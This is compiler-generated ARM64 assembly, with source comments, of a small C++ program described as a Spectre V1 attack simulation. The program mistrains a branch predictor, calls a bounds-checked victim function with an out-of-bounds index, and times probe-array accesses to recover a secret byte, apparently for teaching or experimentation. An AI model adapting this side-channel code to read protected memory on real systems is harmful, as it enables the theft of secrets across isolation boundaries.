	.arch armv8.5-a
	.build_version macos,  15, 0
; GNU C++11 (Homebrew GCC 15.1.0) version 15.1.0 (aarch64-apple-darwin24)
;	compiled by GNU C version 15.1.0, GMP version 6.3.0, MPFR version 4.2.2, MPC version 1.3.1, isl version isl-0.27-GMP

; GGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072
; options passed: -fPIC -mmacosx-version-min=15.0.0 -mcpu=apple-m1 -mlittle-endian -mabi=lp64 -std=c++11
	.text
	.const
__ZStL6ignore:
	.space 1
__ZStL19piecewise_construct:
	.space 1
	.text
	.align	2
	.globl __ZStanSt13_Ios_FmtflagsS_
	.weak_definition __ZStanSt13_Ios_FmtflagsS_
__ZStanSt13_Ios_FmtflagsS_:
LFB1167:
	sub	sp, sp, #16	;,,
LCFI0:
	str	w0, [sp, 12]	; __a, __a
	str	w1, [sp, 8]	; __b, __b
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:87:   { return _Ios_Fmtflags(static_cast<int>(__a) & static_cast<int>(__b)); }
	ldr	w1, [sp, 12]	; tmp103, __a
	ldr	w0, [sp, 8]	; tmp104, __b
	and	w0, w1, w0	; _3, tmp103, tmp104
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:87:   { return _Ios_Fmtflags(static_cast<int>(__a) & static_cast<int>(__b)); }
	add	sp, sp, 16	;,,
LCFI1:
	ret	
LFE1167:
	.align	2
	.globl __ZStorSt13_Ios_FmtflagsS_
	.weak_definition __ZStorSt13_Ios_FmtflagsS_
__ZStorSt13_Ios_FmtflagsS_:
LFB1168:
	sub	sp, sp, #16	;,,
LCFI2:
	str	w0, [sp, 12]	; __a, __a
	str	w1, [sp, 8]	; __b, __b
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:92:   { return _Ios_Fmtflags(static_cast<int>(__a) | static_cast<int>(__b)); }
	ldr	w1, [sp, 12]	; tmp103, __a
	ldr	w0, [sp, 8]	; tmp104, __b
	orr	w0, w1, w0	; _3, tmp103, tmp104
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:92:   { return _Ios_Fmtflags(static_cast<int>(__a) | static_cast<int>(__b)); }
	add	sp, sp, 16	;,,
LCFI3:
	ret	
LFE1168:
	.align	2
	.globl __ZStcoSt13_Ios_Fmtflags
	.weak_definition __ZStcoSt13_Ios_Fmtflags
__ZStcoSt13_Ios_Fmtflags:
LFB1170:
	sub	sp, sp, #16	;,,
LCFI4:
	str	w0, [sp, 12]	; __a, __a
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:102:   { return _Ios_Fmtflags(~static_cast<int>(__a)); }
	ldr	w0, [sp, 12]	; tmp103, __a
	mvn	w0, w0	; _2, tmp103
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:102:   { return _Ios_Fmtflags(~static_cast<int>(__a)); }
	add	sp, sp, 16	;,,
LCFI5:
	ret	
LFE1170:
	.align	2
	.globl __ZStoRRSt13_Ios_FmtflagsS_
	.weak_definition __ZStoRRSt13_Ios_FmtflagsS_
__ZStoRRSt13_Ios_FmtflagsS_:
LFB1171:
	stp	x29, x30, [sp, -32]!	;,,,
LCFI6:
	mov	x29, sp	;,
LCFI7:
	str	x0, [x29, 24]	; __a, __a
	str	w1, [x29, 20]	; __b, __b
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:107:   { return __a = __a | __b; }
	ldr	x0, [x29, 24]	; tmp105, __a
	ldr	w0, [x0]	; _1, *__a_4(D)
	ldr	w1, [x29, 20]	;, __b
	bl	__ZStorSt13_Ios_FmtflagsS_		;
	mov	w1, w0	; _2,
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:107:   { return __a = __a | __b; }
	ldr	x0, [x29, 24]	; tmp106, __a
	str	w1, [x0]	; _2, *__a_4(D)
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:107:   { return __a = __a | __b; }
	ldr	x0, [x29, 24]	; _8, __a
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:107:   { return __a = __a | __b; }
	ldp	x29, x30, [sp], 32	;,,,
LCFI8:
	ret	
LFE1171:
	.align	2
	.globl __ZStaNRSt13_Ios_FmtflagsS_
	.weak_definition __ZStaNRSt13_Ios_FmtflagsS_
__ZStaNRSt13_Ios_FmtflagsS_:
LFB1172:
	stp	x29, x30, [sp, -32]!	;,,,
LCFI9:
	mov	x29, sp	;,
LCFI10:
	str	x0, [x29, 24]	; __a, __a
	str	w1, [x29, 20]	; __b, __b
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:112:   { return __a = __a & __b; }
	ldr	x0, [x29, 24]	; tmp105, __a
	ldr	w0, [x0]	; _1, *__a_4(D)
	ldr	w1, [x29, 20]	;, __b
	bl	__ZStanSt13_Ios_FmtflagsS_		;
	mov	w1, w0	; _2,
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:112:   { return __a = __a & __b; }
	ldr	x0, [x29, 24]	; tmp106, __a
	str	w1, [x0]	; _2, *__a_4(D)
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:112:   { return __a = __a & __b; }
	ldr	x0, [x29, 24]	; _8, __a
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:112:   { return __a = __a & __b; }
	ldp	x29, x30, [sp], 32	;,,,
LCFI11:
	ret	
LFE1172:
	.align	2
	.globl __ZNSt8ios_base4setfESt13_Ios_FmtflagsS0_
	.weak_definition __ZNSt8ios_base4setfESt13_Ios_FmtflagsS0_
__ZNSt8ios_base4setfESt13_Ios_FmtflagsS0_:
LFB1201:
	stp	x29, x30, [sp, -64]!	;,,,
LCFI12:
	mov	x29, sp	;,
LCFI13:
	str	x19, [sp, 16]	;,
LCFI14:
	str	x0, [x29, 40]	; this, this
	str	w1, [x29, 36]	; __fmtfl, __fmtfl
	str	w2, [x29, 32]	; __mask, __mask
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:740:       fmtflags __old = _M_flags;
	ldr	x0, [x29, 40]	; tmp107, this
	ldr	w0, [x0, 24]	; tmp108, this_6(D)->_M_flags
	str	w0, [x29, 60]	; tmp108, __old
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:741:       _M_flags &= ~__mask;
	ldr	x0, [x29, 40]	; tmp109, this
	add	x19, x0, 24	; _1, tmp109,
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:741:       _M_flags &= ~__mask;
	ldr	w0, [x29, 32]	;, __mask
	bl	__ZStcoSt13_Ios_Fmtflags		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:741:       _M_flags &= ~__mask;
	mov	w1, w0	;, _2
	mov	x0, x19	;, _1
	bl	__ZStaNRSt13_Ios_FmtflagsS_		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:742:       _M_flags |= (__fmtfl & __mask);
	ldr	x0, [x29, 40]	; tmp110, this
	add	x19, x0, 24	; _3, tmp110,
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:742:       _M_flags |= (__fmtfl & __mask);
	ldr	w1, [x29, 32]	;, __mask
	ldr	w0, [x29, 36]	;, __fmtfl
	bl	__ZStanSt13_Ios_FmtflagsS_		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:742:       _M_flags |= (__fmtfl & __mask);
	mov	w1, w0	;, _4
	mov	x0, x19	;, _3
	bl	__ZStoRRSt13_Ios_FmtflagsS_		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:743:       return __old;
	ldr	w0, [x29, 60]	; _14, __old
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:744:     }
	ldr	x19, [sp, 16]	;,
	ldp	x29, x30, [sp], 64	;,,,
LCFI15:
	ret	
LFE1201:
	.align	2
	.globl __ZSt3hexRSt8ios_base
	.weak_definition __ZSt3hexRSt8ios_base
__ZSt3hexRSt8ios_base:
LFB1229:
	stp	x29, x30, [sp, -32]!	;,,,
LCFI16:
	mov	x29, sp	;,
LCFI17:
	str	x0, [x29, 24]	; __base, __base
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:1104:     __base.setf(ios_base::hex, ios_base::basefield);
	mov	w2, 74	;,
	mov	w1, 8	;,
	ldr	x0, [x29, 24]	;, __base
	bl	__ZNSt8ios_base4setfESt13_Ios_FmtflagsS0_		;
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:1105:     return __base;
	ldr	x0, [x29, 24]	; _4, __base
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/ios_base.h:1106:   }
	ldp	x29, x30, [sp], 32	;,,,
LCFI18:
	ret	
LFE1229:
	.zerofill __DATA,__bss,__ZStL8__ioinit,1,0
	.text
	.align	2
	.globl __ZNSt6chrono8durationIxSt5ratioILl1ELl1000000000EEEC1IxvEERKT_
	.weak_definition __ZNSt6chrono8durationIxSt5ratioILl1ELl1000000000EEEC1IxvEERKT_
__ZNSt6chrono8durationIxSt5ratioILl1ELl1000000000EEEC1IxvEERKT_:
LFB2248:
	sub	sp, sp, #16	;,,
LCFI19:
	str	x0, [sp, 8]	; this, this
	str	x1, [sp]	; __rep, __rep
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:578: 	  : __r(static_cast<rep>(__rep)) { }
	ldr	x0, [sp]	; tmp102, __rep
	ldr	x1, [x0]	; _1, *__rep_5(D)
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:578: 	  : __r(static_cast<rep>(__rep)) { }
	ldr	x0, [sp, 8]	; tmp103, this
	str	x1, [x0]	; _1, this_3(D)->__r
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:578: 	  : __r(static_cast<rep>(__rep)) { }
	nop	
	add	sp, sp, 16	;,,
LCFI20:
	ret	
LFE2248:
	.align	2
	.globl __ZNKSt6chrono8durationIxSt5ratioILl1ELl1000000000EEE5countEv
	.weak_definition __ZNKSt6chrono8durationIxSt5ratioILl1ELl1000000000EEE5countEv
__ZNKSt6chrono8durationIxSt5ratioILl1ELl1000000000EEE5countEv:
LFB2250:
	sub	sp, sp, #16	;,,
LCFI21:
	str	x0, [sp, 8]	; this, this
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:594: 	{ return __r; }
	ldr	x0, [sp, 8]	; tmp103, this
	ldr	x0, [x0]	; _3, this_2(D)->__r
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:594: 	{ return __r; }
	add	sp, sp, 16	;,,
LCFI22:
	ret	
LFE2250:
	.const
__ZStL13allocator_arg:
	.space 1
	.globl _secret_data
	.data
_secret_data:
	.byte	66
	.globl _public_array
	.align	3
_public_array:
	.ascii "\0\1\2\3\4\5\6\7\10\11\12\13\14\15\16\17"
	.const
	.align	3
__ZL17PUBLIC_ARRAY_SIZE:
	.xword	16
	.globl _probe_array
	.zerofill __DATA,__common,_probe_array,1048576,0
	.text
	.align	2
	.globl __Z15victim_functionm
__Z15victim_functionm:
LFB2758:
	sub	sp, sp, #32	;,,
LCFI23:
	str	x0, [sp, 8]	; index, index
; 1.cpp:23:     if (index < PUBLIC_ARRAY_SIZE)
	ldr	x0, [sp, 8]	; tmp104, index
	cmp	x0, 15	; tmp104,
	bhi	L20		;,
; 1.cpp:27:         unsigned char value = public_array[index]; // This read is transient and unauthorized
	adrp	x0, _public_array@PAGE	; tmp106,
	add	x1, x0, _public_array@PAGEOFF;	; tmp105, tmp106,
	ldr	x0, [sp, 8]	; tmp108, index
	add	x0, x1, x0	; tmp107, tmp105, tmp108
	ldrb	w0, [x0]	; tmp109, public_array[index_5(D)]
	strb	w0, [sp, 31]	; tmp109, value
; 1.cpp:31:         volatile unsigned char temp = probe_array[value * 4096]; // Cache side effect
	ldrb	w0, [sp, 31]	; _1, value
; 1.cpp:31:         volatile unsigned char temp = probe_array[value * 4096]; // Cache side effect
	lsl	w2, w0, 12	; _2, _1,
; 1.cpp:31:         volatile unsigned char temp = probe_array[value * 4096]; // Cache side effect
	adrp	x0, _probe_array@PAGE	; tmp111,
	add	x1, x0, _probe_array@PAGEOFF;	; tmp110, tmp111,
	sxtw	x0, w2	; tmp112, _2
	ldrb	w0, [x1, x0]	; _3, probe_array[_2]
; 1.cpp:31:         volatile unsigned char temp = probe_array[value * 4096]; // Cache side effect
	strb	w0, [sp, 30]	; tmp113, temp
L20:
; 1.cpp:33: }
	nop	
	add	sp, sp, 32	;,,
LCFI24:
	ret	
LFE2758:
	.align	2
	.globl __Z19measure_access_timePVh
__Z19measure_access_timePVh:
LFB2759:
	stp	x29, x30, [sp, -80]!	;,,,
LCFI25:
	mov	x29, sp	;,
LCFI26:
	str	x0, [x29, 24]	; addr, addr
; 1.cpp:41:     auto start = std::chrono::high_resolution_clock::now();
	bl	__ZNSt6chrono3_V212system_clock3nowEv		;
	str	x0, [x29, 56]	; tmp104, start
; 1.cpp:42:     volatile unsigned char temp = *addr; // Access the memory
	ldr	x0, [x29, 24]	; tmp105, addr
	ldrb	w0, [x0]	; tmp106, *addr_5(D)
	and	w0, w0, 255	; _1, tmp106
; 1.cpp:42:     volatile unsigned char temp = *addr; // Access the memory
	strb	w0, [x29, 55]	; tmp107, temp
; 1.cpp:43:     auto end = std::chrono::high_resolution_clock::now();
	bl	__ZNSt6chrono3_V212system_clock3nowEv		;
	str	x0, [x29, 40]	; tmp108, end
; 1.cpp:44:     return std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
	add	x1, x29, 56	; tmp109,,
	add	x0, x29, 40	; tmp110,,
	bl	__ZNSt6chronomiINS_3_V212system_clockENS_8durationIxSt5ratioILl1ELl1000000000EEEES6_EENSt11common_typeIJT0_T1_EE4typeERKNS_10time_pointIT_S8_EERKNSC_ISD_S9_EE		;
	str	x0, [x29, 72]	; tmp111, D.51644
; 1.cpp:44:     return std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
	add	x0, x29, 72	; tmp112,,
	bl	__ZNSt6chrono13duration_castINS_8durationIxSt5ratioILl1ELl1000000000EEEExS3_EENSt9enable_ifIXsrNS_13__is_durationIT_EE5valueES7_E4typeERKNS1_IT0_T1_EE		;
	str	x0, [x29, 64]	; tmp113, D.51653
; 1.cpp:44:     return std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
	add	x0, x29, 64	; tmp114,,
	bl	__ZNKSt6chrono8durationIxSt5ratioILl1ELl1000000000EEE5countEv		;
; 1.cpp:45: }
	ldp	x29, x30, [sp], 80	;,,,
LCFI27:
	ret	
LFE2759:
	.align	2
	.globl __Z16flush_cache_linePVh
__Z16flush_cache_linePVh:
LFB2760:
	sub	sp, sp, #32	;,,
LCFI28:
	str	x0, [sp, 8]	; addr, addr
; 1.cpp:54:     for (int i = 0; i < 256 * 4096; ++i)
	str	wzr, [sp, 28]	;, i
; 1.cpp:54:     for (int i = 0; i < 256 * 4096; ++i)
	b	L24		;
L25:
; 1.cpp:56:         probe_array[i] = 0; // Simple way to "clear" for simulation
	adrp	x0, _probe_array@PAGE	; tmp102,
	add	x1, x0, _probe_array@PAGEOFF;	; tmp101, tmp102,
	ldrsw	x0, [sp, 28]	; tmp103, i
	strb	wzr, [x1, x0]	;, probe_array[i_1]
; 1.cpp:54:     for (int i = 0; i < 256 * 4096; ++i)
	ldr	w0, [sp, 28]	; tmp105, i
	add	w0, w0, 1	; i_6, tmp105,
	str	w0, [sp, 28]	; i_6, i
L24:
; 1.cpp:54:     for (int i = 0; i < 256 * 4096; ++i)
	ldr	w1, [sp, 28]	; tmp106, i
	mov	w0, 1048575	; tmp107,
	cmp	w1, w0	; tmp106, tmp107
	ble	L25		;,
; 1.cpp:58: }
	nop	
	nop	
	add	sp, sp, 32	;,,
LCFI29:
	ret	
LFE2760:
	.cstring
	.align	3
lC0:
	.ascii "Starting Spectre V1 attack simulation...\0"
	.align	3
lC1:
	.ascii "Mistraining branch predictor...\0"
	.align	3
lC2:
	.ascii "Attempting to leak secret...\0"
	.align	3
lC3:
	.ascii "Measuring cache access times to recover secret...\0"
	.align	3
lC4:
	.ascii "Simulated leaked byte: 0x\0"
	.align	3
lC5:
	.ascii "Expected secret byte: 0x\0"
	.text
	.align	2
	.globl _main
_main:
LFB2761:
	stp	x29, x30, [sp, -80]!	;,,,
LCFI30:
	mov	x29, sp	;,
LCFI31:
; 1.cpp:63:     for (int i = 0; i < 256 * 4096; ++i)
	str	wzr, [x29, 76]	;, i
; 1.cpp:63:     for (int i = 0; i < 256 * 4096; ++i)
	b	L27		;
L28:
; 1.cpp:65:         probe_array[i] = 1;
	adrp	x0, _probe_array@PAGE	; tmp123,
	add	x1, x0, _probe_array@PAGEOFF;	; tmp122, tmp123,
	ldrsw	x0, [x29, 76]	; tmp124, i
	mov	w2, 1	; tmp125,
	strb	w2, [x1, x0]	; tmp125, probe_array[i_19]
; 1.cpp:63:     for (int i = 0; i < 256 * 4096; ++i)
	ldr	w0, [x29, 76]	; tmp127, i
	add	w0, w0, 1	; i_79, tmp127,
	str	w0, [x29, 76]	; i_79, i
L27:
; 1.cpp:63:     for (int i = 0; i < 256 * 4096; ++i)
	ldr	w1, [x29, 76]	; tmp128, i
	mov	w0, 1048575	; tmp129,
	cmp	w1, w0	; tmp128, tmp129
	ble	L28		;,
; 1.cpp:76:     unsigned char *secret_location_simulated = &secret_data; // Fixed: point to actual secret data
	adrp	x0, _secret_data@PAGE	; tmp131,
	add	x0, x0, _secret_data@PAGEOFF;	; tmp130, tmp131,
	str	x0, [x29, 40]	; tmp130, secret_location_simulated
; 1.cpp:78:     std::cout << "Starting Spectre V1 attack simulation..." << std::endl;
	adrp	x0, lC0@PAGE	; tmp132,
	add	x1, x0, lC0@PAGEOFF;	;, tmp132,
	adrp	x0, __ZSt4cout@GOTPAGE	;,
	ldr	x0, [x0, __ZSt4cout@GOTPAGEOFF]	;,
	bl	__ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc		;
; 1.cpp:78:     std::cout << "Starting Spectre V1 attack simulation..." << std::endl;
	adrp	x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGE	;,
	ldr	x1, [x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGEOFF]	;,
	bl	__ZNSolsEPFRSoS_E		;
; 1.cpp:82:     std::cout << "Mistraining branch predictor..." << std::endl;
	adrp	x0, lC1@PAGE	; tmp133,
	add	x1, x0, lC1@PAGEOFF;	;, tmp133,
	adrp	x0, __ZSt4cout@GOTPAGE	;,
	ldr	x0, [x0, __ZSt4cout@GOTPAGEOFF]	;,
	bl	__ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc		;
; 1.cpp:82:     std::cout << "Mistraining branch predictor..." << std::endl;
	adrp	x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGE	;,
	ldr	x1, [x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGEOFF]	;,
	bl	__ZNSolsEPFRSoS_E		;
; 1.cpp:83:     for (int i = 0; i < 1000; ++i)
	str	wzr, [x29, 72]	;, i
; 1.cpp:83:     for (int i = 0; i < 1000; ++i)
	b	L29		;
L30:
; 1.cpp:85:         victim_function(i % PUBLIC_ARRAY_SIZE); // Always in-bounds
	ldrsw	x0, [x29, 72]	; _3, i
; 1.cpp:85:         victim_function(i % PUBLIC_ARRAY_SIZE); // Always in-bounds
	and	x0, x0, 15	; _4, _3,
	bl	__Z15victim_functionm		;
; 1.cpp:83:     for (int i = 0; i < 1000; ++i)
	ldr	w0, [x29, 72]	; tmp135, i
	add	w0, w0, 1	; i_77, tmp135,
	str	w0, [x29, 72]	; i_77, i
L29:
; 1.cpp:83:     for (int i = 0; i < 1000; ++i)
	ldr	w0, [x29, 72]	; tmp136, i
	cmp	w0, 999	; tmp136,
	ble	L30		;,
; 1.cpp:89:     std::cout << "Attempting to leak secret..." << std::endl;
	adrp	x0, lC2@PAGE	; tmp137,
	add	x1, x0, lC2@PAGEOFF;	;, tmp137,
	adrp	x0, __ZSt4cout@GOTPAGE	;,
	ldr	x0, [x0, __ZSt4cout@GOTPAGEOFF]	;,
	bl	__ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc		;
; 1.cpp:89:     std::cout << "Attempting to leak secret..." << std::endl;
	adrp	x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGE	;,
	ldr	x1, [x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGEOFF]	;,
	bl	__ZNSolsEPFRSoS_E		;
; 1.cpp:90:     size_t malicious_index = PUBLIC_ARRAY_SIZE; // This index is out-of-bounds
	mov	x0, 16	; tmp138,
	str	x0, [x29, 32]	; tmp138, malicious_index
; 1.cpp:93:     for (int i = 0; i < 256; ++i)
	str	wzr, [x29, 68]	;, i
; 1.cpp:93:     for (int i = 0; i < 256; ++i)
	b	L31		;
L32:
; 1.cpp:95:         flush_cache_line(&probe_array[i * 4096]);
	ldr	w0, [x29, 68]	; tmp139, i
	lsl	w0, w0, 12	; _6, tmp139,
; 1.cpp:95:         flush_cache_line(&probe_array[i * 4096]);
	sxtw	x1, w0	; tmp140, _6
	adrp	x0, _probe_array@PAGE	; tmp142,
	add	x0, x0, _probe_array@PAGEOFF;	; tmp141, tmp142,
	add	x0, x1, x0	; _7, tmp140, tmp141
; 1.cpp:95:         flush_cache_line(&probe_array[i * 4096]);
	bl	__Z16flush_cache_linePVh		;
; 1.cpp:93:     for (int i = 0; i < 256; ++i)
	ldr	w0, [x29, 68]	; tmp144, i
	add	w0, w0, 1	; i_75, tmp144,
	str	w0, [x29, 68]	; i_75, i
L31:
; 1.cpp:93:     for (int i = 0; i < 256; ++i)
	ldr	w0, [x29, 68]	; tmp145, i
	cmp	w0, 255	; tmp145,
	ble	L32		;,
; 1.cpp:99:     victim_function(malicious_index);
	ldr	x0, [x29, 32]	;, malicious_index
	bl	__Z15victim_functionm		;
; 1.cpp:102:     std::cout << "Measuring cache access times to recover secret..." << std::endl;
	adrp	x0, lC3@PAGE	; tmp146,
	add	x1, x0, lC3@PAGEOFF;	;, tmp146,
	adrp	x0, __ZSt4cout@GOTPAGE	;,
	ldr	x0, [x0, __ZSt4cout@GOTPAGEOFF]	;,
	bl	__ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc		;
; 1.cpp:102:     std::cout << "Measuring cache access times to recover secret..." << std::endl;
	adrp	x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGE	;,
	ldr	x1, [x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGEOFF]	;,
	bl	__ZNSolsEPFRSoS_E		;
; 1.cpp:103:     long long min_time = -1;
	mov	x0, -1	; tmp147,
	str	x0, [x29, 56]	; tmp147, min_time
; 1.cpp:104:     int leaked_byte = -1;
	mov	w0, -1	; tmp148,
	str	w0, [x29, 52]	; tmp148, leaked_byte
; 1.cpp:106:     for (int i = 0; i < 256; ++i)
	str	wzr, [x29, 48]	;, i
; 1.cpp:106:     for (int i = 0; i < 256; ++i)
	b	L33		;
L36:
; 1.cpp:108:         long long time = measure_access_time(&probe_array[i * 4096]);
	ldr	w0, [x29, 48]	; tmp149, i
	lsl	w0, w0, 12	; _9, tmp149,
; 1.cpp:108:         long long time = measure_access_time(&probe_array[i * 4096]);
	sxtw	x1, w0	; tmp150, _9
	adrp	x0, _probe_array@PAGE	; tmp152,
	add	x0, x0, _probe_array@PAGEOFF;	; tmp151, tmp152,
	add	x0, x1, x0	; _10, tmp150, tmp151
; 1.cpp:108:         long long time = measure_access_time(&probe_array[i * 4096]);
	bl	__Z19measure_access_timePVh		;
; 1.cpp:108:         long long time = measure_access_time(&probe_array[i * 4096]);
	str	x0, [x29, 24]	; _69, time
; 1.cpp:109:         if (min_time == -1 || time < min_time)
	ldr	x0, [x29, 56]	; tmp153, min_time
	cmn	x0, #1	; tmp153,
	beq	L34		;,
; 1.cpp:109:         if (min_time == -1 || time < min_time)
	ldr	x1, [x29, 24]	; tmp154, time
	ldr	x0, [x29, 56]	; tmp155, min_time
	cmp	x1, x0	; tmp154, tmp155
	bge	L35		;,
L34:
; 1.cpp:111:             min_time = time;
	ldr	x0, [x29, 24]	; tmp156, time
	str	x0, [x29, 56]	; tmp156, min_time
; 1.cpp:112:             leaked_byte = i;
	ldr	w0, [x29, 48]	; tmp157, i
	str	w0, [x29, 52]	; tmp157, leaked_byte
L35:
; 1.cpp:106:     for (int i = 0; i < 256; ++i)
	ldr	w0, [x29, 48]	; tmp159, i
	add	w0, w0, 1	; i_73, tmp159,
	str	w0, [x29, 48]	; i_73, i
L33:
; 1.cpp:106:     for (int i = 0; i < 256; ++i)
	ldr	w0, [x29, 48]	; tmp160, i
	cmp	w0, 255	; tmp160,
	ble	L36		;,
; 1.cpp:116:     std::cout << "Simulated leaked byte: 0x" << std::hex << leaked_byte << std::endl;
	adrp	x0, lC4@PAGE	; tmp161,
	add	x1, x0, lC4@PAGEOFF;	;, tmp161,
	adrp	x0, __ZSt4cout@GOTPAGE	;,
	ldr	x0, [x0, __ZSt4cout@GOTPAGEOFF]	;,
	bl	__ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc		;
; 1.cpp:116:     std::cout << "Simulated leaked byte: 0x" << std::hex << leaked_byte << std::endl;
	adrp	x1, __ZSt3hexRSt8ios_base@GOTPAGE	;,
	ldr	x1, [x1, __ZSt3hexRSt8ios_base@GOTPAGEOFF]	;,
	bl	__ZNSolsEPFRSt8ios_baseS0_E		;
; 1.cpp:116:     std::cout << "Simulated leaked byte: 0x" << std::hex << leaked_byte << std::endl;
	ldr	w1, [x29, 52]	;, leaked_byte
	bl	__ZNSolsEi		;
; 1.cpp:116:     std::cout << "Simulated leaked byte: 0x" << std::hex << leaked_byte << std::endl;
	adrp	x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGE	;,
	ldr	x1, [x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGEOFF]	;,
	bl	__ZNSolsEPFRSoS_E		;
; 1.cpp:117:     std::cout << "Expected secret byte: 0x" << std::hex << (int)*secret_location_simulated << std::endl;
	adrp	x0, lC5@PAGE	; tmp162,
	add	x1, x0, lC5@PAGEOFF;	;, tmp162,
	adrp	x0, __ZSt4cout@GOTPAGE	;,
	ldr	x0, [x0, __ZSt4cout@GOTPAGEOFF]	;,
	bl	__ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc		;
; 1.cpp:117:     std::cout << "Expected secret byte: 0x" << std::hex << (int)*secret_location_simulated << std::endl;
	adrp	x1, __ZSt3hexRSt8ios_base@GOTPAGE	;,
	ldr	x1, [x1, __ZSt3hexRSt8ios_base@GOTPAGEOFF]	;,
	bl	__ZNSolsEPFRSt8ios_baseS0_E		;
	mov	x2, x0	; _15,
; 1.cpp:117:     std::cout << "Expected secret byte: 0x" << std::hex << (int)*secret_location_simulated << std::endl;
	ldr	x0, [x29, 40]	; tmp163, secret_location_simulated
	ldrb	w0, [x0]	; _16, *secret_location_simulated_33
; 1.cpp:117:     std::cout << "Expected secret byte: 0x" << std::hex << (int)*secret_location_simulated << std::endl;
	mov	w1, w0	;, _17
	mov	x0, x2	;, _15
	bl	__ZNSolsEi		;
; 1.cpp:117:     std::cout << "Expected secret byte: 0x" << std::hex << (int)*secret_location_simulated << std::endl;
	adrp	x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGE	;,
	ldr	x1, [x1, __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GOTPAGEOFF]	;,
	bl	__ZNSolsEPFRSoS_E		;
; 1.cpp:119:     return 0;
	mov	w0, 0	; _67,
; 1.cpp:120: }
	ldp	x29, x30, [sp], 80	;,,,
LCFI32:
	ret	
LFE2761:
	.align	2
	.globl __ZNKSt6chrono10time_pointINS_3_V212system_clockENS_8durationIxSt5ratioILl1ELl1000000000EEEEE16time_since_epochEv
	.weak_definition __ZNKSt6chrono10time_pointINS_3_V212system_clockENS_8durationIxSt5ratioILl1ELl1000000000EEEEE16time_since_epochEv
__ZNKSt6chrono10time_pointINS_3_V212system_clockENS_8durationIxSt5ratioILl1ELl1000000000EEEEE16time_since_epochEv:
LFB2978:
	sub	sp, sp, #16	;,,
LCFI33:
	str	x0, [sp, 8]	; this, this
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:954: 	{ return __d; }
	ldr	x0, [sp, 8]	; tmp103, this
	ldr	x0, [x0]	; D.54953, this_2(D)->__d
; /opt/homebrew/Cellar/gcc/15.1.0/include/c++/15/bits/chrono.h:954: 	{ return __d; }
	add	sp, sp, 16	;,,
LCFI34:
	ret	
LFE2978:
	.align	2
